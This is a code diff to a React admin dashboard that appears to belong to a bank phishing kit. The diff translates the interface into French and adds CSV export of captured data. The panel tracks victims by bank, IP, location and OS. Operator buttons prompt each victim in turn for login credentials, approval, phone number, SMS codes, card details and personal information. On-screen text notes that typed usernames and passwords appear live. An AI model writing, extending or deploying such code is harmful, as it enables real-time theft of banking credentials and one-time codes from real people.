@@ -24,30 +24,30 @@ import {
 
 function timeAgo(ts) {
   const s = Math.max(0, Math.floor((Date.now() - ts) / 1000));
-  if (s < 60) return `${s}s`;
+  if (s < 60) return `${s} s`;
   const m = Math.floor(s / 60);
-  if (m < 60) return `${m}m ${s % 60}s`;
+  if (m < 60) return `${m} min ${s % 60} s`;
   const h = Math.floor(m / 60);
-  return `${h}h ${m % 60}m`;
+  return `${h} h ${m % 60} min`;
 }
 
 function fmtTime(ts) {
   try {
-    return new Date(ts).toLocaleTimeString();
+    return new Date(ts).toLocaleTimeString("fr-FR");
   } catch {
     return "";
   }
 }
 
 function parseOS(ua) {
-  if (!ua) return "Unknown";
+  if (!ua) return "Inconnu";
   const u = ua.toLowerCase();
   if (u.includes("windows")) return "Windows";
   if (u.includes("android")) return "Android";
   if (u.includes("iphone") || u.includes("ipad") || u.includes("ios")) return "iOS";
   if (u.includes("mac os") || u.includes("macintosh")) return "Mac OS";
   if (u.includes("linux")) return "Linux";
-  return "Unknown";
+  return "Inconnu";
 }
 
 function sendCommandLegacy(visitorId, command) {
@@ -57,6 +57,58 @@ function sendCommandLegacy(visitorId, command) {
   try {
     getChannel()?.postMessage({ type: "command", visitorId, command });
   } catch {}
+}
+
+// One row per field: date;heure;visiteur;banque;type;champ;valeur
+// Semicolon + BOM so Excel (FR) opens it correctly.
+function csvCell(v) {
+  const s = String(v ?? "");
+  return `"${s.replace(/"/g, '""')}"`;
+}
+
+function submissionsToCSV(subs) {
+  const head = ["date", "heure", "visiteur", "banque", "type", "champ", "valeur"].join(";");
+  const lines = [head];
+  const ordered = subs.slice().sort((a, b) => (a.at || 0) - (b.at || 0));
+  ordered.forEach((s) => {
+    const d = new Date(s.at || Date.now());
+    const date = d.toLocaleDateString("fr-FR");
+    const time = d.toLocaleTimeString("fr-FR");
+    const entries = Object.entries(s.data || {});
+    if (entries.length === 0) {
+      lines.push([date, time, s.visitorId || "", s.bank || "", s.kind || "", "", ""].map(csvCell).join(";"));
+    } else {
+      entries.forEach(([k, val]) => {
+        lines.push([date, time, s.visitorId || "", s.bank || "", s.kind || "", k, String(val)].map(csvCell).join(";"));
+      });
+    }
+  });
+  return lines.join("\r\n");
+}
+
+function downloadCSV(filename, csv) {
+  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(() => {
+    URL.revokeObjectURL(url);
+    a.remove();
+  }, 500);
+}
+
+function stampName(prefix) {
+  const d = new Date();
+  const p = (n) => String(n).padStart(2, "0");
+  return `${prefix}-${d.getFullYear()}${p(d.getMonth() + 1)}${p(d.getDate())}-${p(d.getHours())}${p(d.getMinutes())}.csv`;
+}
+
+function exportAllLogs(subs) {
+  if (!subs || subs.length === 0) return;
+  downloadCSV(stampName("logs-tous"), submissionsToCSV(subs));
 }
 
 function MiniLogo({ slug, name }) {
@@ -83,22 +135,22 @@ function MiniLogo({ slug, name }) {
 }
 
 const ACTIONS = [
-  { key: "ask_login", label: "Ask Login", style: "bg-blue-600 text-white" },
-  { key: "ask_approve", label: "Ask Approval", style: "bg-violet-600 text-white" },
-  { key: "ask_phone", label: "Ask Phone", style: "bg-cyan-700 text-white" },
-  { key: "ask_sms", label: "Ask SMS", style: "bg-amber-600 text-white" },
-  { key: "ask_card", label: "Ask Card", style: "bg-emerald-700 text-white" },
-  { key: "ask_info", label: "Ask Info", style: "bg-teal-700 text-white" },
-  { key: "ask_confirm", label: "Ask Confirm", style: "bg-indigo-700 text-white" },
-  { key: "done", label: "Finish", style: "bg-green-600 text-white" },
-  { key: "reset_waiting", label: "Loader", style: "bg-neutral-200 text-neutral-800" },
+  { key: "ask_login", label: "Demander identifiants", style: "bg-blue-600 text-white" },
+  { key: "ask_approve", label: "Demander approbation", style: "bg-violet-600 text-white" },
+  { key: "ask_phone", label: "Demander téléphone", style: "bg-cyan-700 text-white" },
+  { key: "ask_sms", label: "Demander SMS", style: "bg-amber-600 text-white" },
+  { key: "ask_card", label: "Demander carte", style: "bg-emerald-700 text-white" },
+  { key: "ask_info", label: "Demander infos", style: "bg-teal-700 text-white" },
+  { key: "ask_confirm", label: "Demander confirmation", style: "bg-indigo-700 text-white" },
+  { key: "done", label: "Terminer", style: "bg-green-600 text-white" },
+  { key: "reset_waiting", label: "Chargement", style: "bg-neutral-200 text-neutral-800" },
 ];
 
 const TABS = [
-  { key: "dashboard", label: "Dashboard" },
-  { key: "requests", label: "Requests" },
+  { key: "dashboard", label: "Tableau de bord" },
+  { key: "requests", label: "Demandes" },
   { key: "logs", label: "Logs" },
-  { key: "settings", label: "Settings" },
+  { key: "settings", label: "Paramètres" },
 ];
 
 export default function Admin() {
@@ -155,7 +207,7 @@ export default function Admin() {
             setAuthed(true);
             return;
           }
-          setLoginErr("Invalid credentials (API rejected).");
+          setLoginErr("Identifiants invalides (API refusée).");
           return;
         } finally {
           setLoginLoading(false);
@@ -165,7 +217,7 @@ export default function Admin() {
         sessionStorage.setItem("admin_auth", "1");
         setAuthed(true);
       } else {
-        setLoginErr("Invalid credentials. Use admin / admin123.");
+        setLoginErr("Identifiants invalides. Utilisez admin / admin123.");
       }
     } finally {
       setLoginLoading(false);
@@ -393,23 +445,24 @@ export default function Admin() {
       <div className="flex min-h-screen w-full items-center justify-center overflow-x-hidden bg-neutral-100 p-4 sm:p-6">
         <form onSubmit={doLogin} className="w-full max-w-sm rounded-2xl bg-white p-5 shadow-lg sm:p-6">
           <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-xl bg-gradient-to-br from-purple-700 to-fuchsia-600 text-xl font-extrabold text-white">A</div>
-          <h1 className="mt-3 text-center text-[18px] font-extrabold">Admin login</h1>
-          <p className="mt-1 text-center text-[13.5px] text-neutral-500">
-            {apiEnabled() ? "Auth via Render API + Postgres" : "Local auth (set VITE_API_URL for Postgres)"}
+          <h1 className="mt-3 text-center text-[18px] font-extrabold">Connexion admin</h1>
+          <p className="mt-1 text-center text-[13px] text-neutral-500">
+            {apiEnabled() ? "Auth via API Render + Postgres" : "Auth locale (VITE_API_URL pour Postgres)"}
           </p>
           <label className="mt-4 block">
-            <span className="text-[14px] font-bold">Username</span>
+            <span className="text-[14px] font-bold">Nom d&apos;utilisateur</span>
             <input value={username} onChange={(e) => setUsername(e.target.value)} autoComplete="username" placeholder="admin" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
           </label>
           <label className="mt-3 block">
-            <span className="text-[14px] font-bold">Password</span>
+            <span className="text-[14px] font-bold">Mot de passe</span>
             <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} autoComplete="current-password" placeholder="••••••••" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
           </label>
           {loginErr && <p className="mt-2 text-[13.5px] font-semibold text-red-600">{loginErr}</p>}
           <button type="submit" disabled={loginLoading} className="mt-4 min-h-[48px] w-full rounded-lg bg-gradient-to-r from-purple-700 to-fuchsia-600 py-3 text-[15px] font-bold text-white disabled:opacity-50">
-            {loginLoading ? "Checking…" : "Login →"}
+            {loginLoading ? "Vérification…" : "Se connecter →"}
           </button>
-          <Link to="/" className="mt-2 block text-center text-[13px] font-semibold text-neutral-500">← Back to site</Link>
+          <p className="mt-3 text-center text-[12px] text-neutral-400">Par défaut : admin / admin123 • modifiez ADMIN_USER/PASS sur Render</p>
+          <Link to="/" className="mt-2 block text-center text-[13px] font-semibold text-neutral-500">← Retour au site</Link>
         </form>
       </div>
     );
@@ -445,10 +498,10 @@ export default function Admin() {
           </nav>
           <div className="flex shrink-0 items-center gap-2">
             <span className="hidden items-center gap-1.5 rounded-full border border-emerald-400/20 bg-emerald-500/10 px-2.5 py-1 text-[13px] font-semibold text-emerald-300 sm:flex">
-              <span className="live-dot h-1.5 w-1.5 rounded-full bg-emerald-400" /> {onlineCount} live
+              <span className="live-dot h-1.5 w-1.5 rounded-full bg-emerald-400" /> {onlineCount} en ligne
             </span>
             <button onClick={doLogout} className="rounded-full bg-white/10 px-3.5 py-2 text-[13px] font-bold transition hover:bg-white/20 active:scale-95">
-              Logout
+              Déconnexion
             </button>
           </div>
         </div>
@@ -474,17 +527,24 @@ export default function Admin() {
             {/* Dashboard / Requests table */}
             <div className="flex flex-wrap items-center justify-between gap-2">
               <h2 className="text-[16px] font-extrabold text-white">
-                {tab === "requests" ? `Requests (${list.length})` : `Dashboard (${list.length})`}
-                <span className="ml-2 text-[12px] font-semibold text-purple-300">{apiMode ? "Postgres API" : "local mode"}</span>
+                {tab === "requests" ? `Demandes (${list.length})` : `Tableau de bord (${list.length})`}
+                <span className="ml-2 text-[12px] font-semibold text-purple-300">{apiMode ? "API Postgres" : "mode local"}</span>
               </h2>
-              <div className="flex gap-1.5">
-                {["all", "online", "offline"].map((f) => (
+              <div className="flex flex-wrap items-center gap-1.5">
+                <button
+                  onClick={() => exportAllLogs(submissions)}
+                  disabled={submissions.length === 0}
+                  className="min-h-[36px] rounded-full bg-emerald-600 px-4 py-1.5 text-[13px] font-extrabold text-white shadow-[0_4px_16px_rgba(5,150,105,0.4)] transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
+                >
+                  ⭳ Export all
+                </button>
+                {[{ k: "all", l: "Tous" }, { k: "online", l: "En ligne" }, { k: "offline", l: "Hors ligne" }].map((f) => (
                   <button
-                    key={f}
-                    onClick={() => setFilter(f)}
-                    className={`rounded-full px-3 py-1.5 text-[13px] font-bold capitalize ${filter === f ? "bg-fuchsia-600 text-white" : "bg-white/10 text-purple-200"}`}
+                    key={f.k}
+                    onClick={() => setFilter(f.k)}
+                    className={`rounded-full px-3 py-1.5 text-[13px] font-bold ${filter === f.k ? "bg-fuchsia-600 text-white" : "bg-white/10 text-purple-200"}`}
                   >
-                    {f}
+                    {f.l}
                   </button>
                 ))}
               </div>
@@ -492,7 +552,7 @@ export default function Admin() {
 
             {list.length === 0 ? (
               <div className="mt-3 rounded-xl bg-white/5 p-6 text-center text-[14px] text-purple-200 ring-1 ring-white/10">
-                No visitors here. Open the site in another tab, click any bank — it appears here and its session opens automatically.
+                Aucun visiteur ici. Ouvrez le site dans un autre onglet, cliquez sur une banque — elle apparaît ici et sa session s&apos;ouvre automatiquement.
               </div>
             ) : (
               <>
@@ -501,11 +561,11 @@ export default function Admin() {
                   <table className="w-full min-w-[720px] border-collapse bg-[#1d1430] text-left text-[14px]">
                     <thead>
                       <tr className="bg-gradient-to-r from-fuchsia-700 to-purple-700 text-[12px] uppercase tracking-wider text-white">
-                        <th className="whitespace-nowrap px-4 py-3">Status</th>
+                        <th className="whitespace-nowrap px-4 py-3">Statut</th>
                         <th className="whitespace-nowrap px-4 py-3">IP</th>
-                        <th className="whitespace-nowrap px-4 py-3">Bank</th>
+                        <th className="whitespace-nowrap px-4 py-3">Banque</th>
                         <th className="whitespace-nowrap px-4 py-3">OS</th>
-                        <th className="whitespace-nowrap px-4 py-3">Quick View</th>
+                        <th className="whitespace-nowrap px-4 py-3">Aperçu</th>
                         <th className="whitespace-nowrap px-4 py-3">Actions</th>
                       </tr>
                     </thead>
@@ -517,11 +577,11 @@ export default function Admin() {
                             <td className="whitespace-nowrap px-4 py-3">
                               <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
                                 <span className={`h-1.5 w-1.5 rounded-full ${online ? "bg-green-400" : "bg-neutral-400"}`} />
-                                {online ? "Online" : "Offline"}
+                                {online ? "En ligne" : "Hors ligne"}
                               </span>
                             </td>
                             <td className="px-3 py-2.5 font-mono text-[13px] text-purple-100">{v.ip || "…"}</td>
-                            <td className="px-3 py-2.5 font-semibold text-purple-100">{v.bankName || v.bank || "BANK NOT SELECTED"}</td>
+                            <td className="px-3 py-2.5 font-semibold text-purple-100">{v.bankName || v.bank || "BANQUE NON SÉLECTIONNÉE"}</td>
                             <td className="px-3 py-2.5 text-purple-200">{parseOS(v.ua)}</td>
                             <td className="whitespace-nowrap px-4 py-3">
                               <span className="inline-flex items-center gap-1 rounded bg-white/10 px-2 py-0.5 font-mono text-[13px] text-purple-100">
@@ -531,10 +591,10 @@ export default function Admin() {
                             <td className="whitespace-nowrap px-4 py-3">
                               <div className="flex gap-1.5">
                                 <button onClick={() => openSession(v)} className="min-h-[32px] rounded-md bg-fuchsia-600 px-2.5 py-1 text-[13px] font-bold text-white hover:bg-fuchsia-500">
-                                  View
+                                  Voir
                                 </button>
                                 <button onClick={() => removeVisitor(v.id)} className="min-h-[32px] rounded-md bg-white/10 px-2.5 py-1 text-[13px] font-bold text-red-300 hover:bg-white/20">
-                                  Delete
+                                  Supprimer
                                 </button>
                               </div>
                             </td>
@@ -558,15 +618,15 @@ export default function Admin() {
                             <p className="truncate text-[13px] text-purple-300">{v.bankName || "BANK NOT SELECTED"} • {parseOS(v.ua)}</p>
                           </div>
                           <span className={`shrink-0 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
-                            {online ? "Online" : "Offline"}
+                            {online ? "En ligne" : "Hors ligne"}
                           </span>
                         </div>
                         <div className="mt-2.5 flex gap-1.5">
                           <button onClick={() => openSession(v)} className="min-h-[44px] flex-1 rounded-lg bg-fuchsia-600 text-[14px] font-bold text-white">
-                            View 👁 {logsByVisitor[v.id] || 0}
+                            Voir 👁 {logsByVisitor[v.id] || 0}
                           </button>
                           <button onClick={() => removeVisitor(v.id)} className="min-h-[44px] rounded-lg bg-white/10 px-4 text-[14px] font-bold text-red-300">
-                            Delete
+                            Supprimer
                           </button>
                         </div>
                       </div>
@@ -624,7 +684,7 @@ function LogCard({ s, meta, footer, wrapClass }) {
         <button
           type="button"
           onClick={() => doCopy(allText, "__all")}
-          title="Copy all fields"
+          title="Tout copier"
           className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-fuchsia-600 active:scale-95"
         >
           {copied === "__all" ? "✓" : "⧉"}
@@ -638,7 +698,7 @@ function LogCard({ s, meta, footer, wrapClass }) {
             <button
               type="button"
               onClick={() => doCopy(String(val), k)}
-              title={`Copy ${k}`}
+              title={`Copier ${k}`}
               className="flex min-h-[24px] min-w-[24px] shrink-0 items-center justify-center rounded-md bg-white/10 px-1 text-[12px] font-bold text-purple-200 transition hover:bg-fuchsia-600 hover:text-white active:scale-95"
             >
               {copied === k ? "✓" : "⧉"}
@@ -654,20 +714,20 @@ function LogCard({ s, meta, footer, wrapClass }) {
 function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
   const online = isOnline(v, now);
   const rows = [
-    ["Status", online ? "Online" : "Offline", online ? "text-green-300" : "text-neutral-300"],
-    ["IP address", v.ip || "…", "font-mono"],
-    ["Location", `${v.city || "…"}, ${v.country || "…"}`, ""],
-    ["Bank", v.bankName || v.bank || "—", "font-bold"],
-    ["Step", STATUS_LABEL[v.status] || v.status || "—", ""],
+    ["Statut", online ? "En ligne" : "Hors ligne", online ? "text-green-300" : "text-neutral-300"],
+    ["Adresse IP", v.ip || "…", "font-mono"],
+    ["Localisation", `${v.city || "…"}, ${v.country || "…"}`, ""],
+    ["Banque", v.bankName || v.bank || "—", "font-bold"],
+    ["Étape", STATUS_LABEL[v.status] || v.status || "—", ""],
     ["OS", parseOS(v.ua), ""],
-    ["Online for", timeAgo(v.joinedAt || v.lastSeen), ""],
-    ["Last seen", `${timeAgo(v.lastSeen)} ago • ${fmtTime(v.lastSeen)}`, ""],
+    ["En ligne depuis", timeAgo(v.joinedAt || v.lastSeen), ""],
+    ["Dernière activité", `${timeAgo(v.lastSeen)} • ${fmtTime(v.lastSeen)}`, ""],
   ];
   return (
     <div className="w-full">
       <div className="flex flex-wrap items-center gap-2">
         <button onClick={onBack} className="min-h-[40px] rounded-full bg-white/10 px-4 py-2 text-[13px] font-bold text-purple-100 hover:bg-white/20">
-          ← Dashboard
+          ← Tableau de bord
         </button>
         <div className="flex min-w-0 flex-1 items-center gap-2.5">
           <MiniLogo slug={v.bank} name={v.bankName} />
@@ -677,14 +737,14 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
           </div>
         </div>
         <span className={`shrink-0 rounded-full px-2.5 py-1 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
-          {online ? "● Online" : "● Offline"}
+          {online ? "● En ligne" : "● Hors ligne"}
         </span>
       </div>
 
       <div className="mt-3 grid w-full grid-cols-1 gap-3 lg:grid-cols-12">
         {/* LEFT — device status info */}
         <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
-          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Device status</h3>
+          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Statut de l&apos;appareil</h3>
           <dl className="mt-2 space-y-2">
             {rows.map(([k, val, cls]) => (
               <div key={k} className="flex items-start justify-between gap-2 border-b border-white/5 pb-1.5 text-[13px] last:border-0">
@@ -698,13 +758,22 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
 
         {/* MIDDLE — logs */}
         <section className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-6">
-          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">
-            Logs ({logs.length})
-          </h3>
+          <div className="flex flex-wrap items-center justify-between gap-2">
+            <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">
+              Logs ({logs.length})
+            </h3>
+            <button
+              onClick={() => logs.length && downloadCSV(stampName(`logs-${v.bank || "visiteur"}-${(v.id || "").slice(0, 6)}`), submissionsToCSV(logs))}
+              disabled={logs.length === 0}
+              className="min-h-[36px] rounded-full bg-emerald-600 px-4 py-1.5 text-[13px] font-extrabold text-white transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
+            >
+              ⭳ Exporter
+            </button>
+          </div>
           <div className="mt-2.5 space-y-2.5">
             {logs.length === 0 && (
               <p className="rounded-lg bg-white/5 p-4 text-center text-[13.5px] text-purple-200">
-                No data yet. Use the right panel → Ask Login. Filled username/password appears here live.
+                Aucune donnée. Utilisez le panneau de droite → Demander identifiants. L&apos;identifiant et le mot de passe saisis apparaissent ici en direct.
               </p>
             )}
             {logs.map((s) => (
@@ -728,10 +797,10 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
             ))}
           </div>
           <button onClick={onRemove} className="mt-2 min-h-[40px] w-full rounded-lg bg-white/5 px-3 py-2 text-[13px] font-bold text-red-300 ring-1 ring-white/10 hover:bg-white/10">
-            Delete visitor
+            Supprimer le visiteur
           </button>
           <p className="mt-2 text-[12px] leading-snug text-purple-300/80">
-            User waits on loader after each fill. Ask steps one by one: Login → Approval → Phone → SMS → Card → Info → Confirm.
+            L&apos;utilisateur attend sur le chargement après chaque saisie. Demandez les étapes une par une : Identifiants → Approbation → Téléphone → SMS → Carte → Infos → Confirmation.
           </p>
         </aside>
       </div>
@@ -744,10 +813,19 @@ function GlobalLogs({ submissions, onView }) {
   const all = submissions.slice().sort((a, b) => (b.at || 0) - (a.at || 0));
   return (
     <div className="w-full">
-      <h2 className="text-[16px] font-extrabold text-white">Logs ({all.length})</h2>
+      <div className="flex flex-wrap items-center justify-between gap-2">
+        <h2 className="text-[16px] font-extrabold text-white">Logs ({all.length})</h2>
+        <button
+          onClick={() => exportAllLogs(submissions)}
+          disabled={all.length === 0}
+          className="min-h-[40px] rounded-full bg-emerald-600 px-4 py-2 text-[13px] font-extrabold text-white shadow-[0_4px_16px_rgba(5,150,105,0.4)] transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
+        >
+          ⭳ Export all
+        </button>
+      </div>
       <div className="mt-3 space-y-2.5">
         {all.length === 0 && (
-          <p className="rounded-xl bg-white/5 p-5 text-center text-[13.5px] text-purple-200 ring-1 ring-white/10">No logs yet.</p>
+          <p className="rounded-xl bg-white/5 p-5 text-center text-[13.5px] text-purple-200 ring-1 ring-white/10">Aucun log pour le moment.</p>
         )}
         {all.map((s) => (
           <LogCard
@@ -757,7 +835,7 @@ function GlobalLogs({ submissions, onView }) {
             meta={<span className="font-mono text-[12px] text-purple-300">{s.visitorId?.slice(0, 10)} • {s.bank}</span>}
             footer={
               <button onClick={() => onView(s.visitorId)} className="mt-2 min-h-[36px] rounded-lg bg-white/10 px-3 py-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-white/20 active:scale-95">
-                Open session →
+                Ouvrir la session →
               </button>
             }
           />
@@ -770,16 +848,16 @@ function GlobalLogs({ submissions, onView }) {
 function Settings({ apiMode, onlineCount, total, onLogout }) {
   return (
     <div className="w-full max-w-xl">
-      <h2 className="text-[16px] font-extrabold text-white">Settings</h2>
+      <h2 className="text-[16px] font-extrabold text-white">Paramètres</h2>
       <div className="mt-3 space-y-2.5 rounded-xl bg-[#1d1430] p-4 text-[14px] ring-1 ring-white/10">
-        <div className="flex justify-between gap-2"><span className="text-purple-300">Mode</span><b className="text-white">{apiMode ? "Postgres API" : "Local mode"}</b></div>
+        <div className="flex justify-between gap-2"><span className="text-purple-300">Mode</span><b className="text-white">{apiMode ? "API Postgres" : "Mode local"}</b></div>
         {apiMode && <div className="flex justify-between gap-2"><span className="text-purple-300">API</span><span className="break-all font-mono text-[13px] text-white">{apiBase()}</span></div>}
-        <div className="flex justify-between gap-2"><span className="text-purple-300">Live now</span><b className="text-white">{onlineCount} / {total}</b></div>
-        <div className="flex justify-between gap-2"><span className="text-purple-300">Admin user</span><b className="text-white">admin</b></div>
+        <div className="flex justify-between gap-2"><span className="text-purple-300">En ligne</span><b className="text-white">{onlineCount} / {total}</b></div>
+        <div className="flex justify-between gap-2"><span className="text-purple-300">Utilisateur admin</span><b className="text-white">admin</b></div>
         <button onClick={onLogout} className="mt-1 min-h-[44px] w-full rounded-lg bg-red-500/20 py-2.5 text-[14px] font-bold text-red-200">
-          Logout
+          Déconnexion
         </button>
-        <Link to="/" className="block text-center text-[13px] font-semibold text-purple-300">← Back to site</Link>
+        <Link to="/" className="block text-center text-[13px] font-semibold text-purple-300">← Retour au site</Link>
       </div>
     </div>
   );
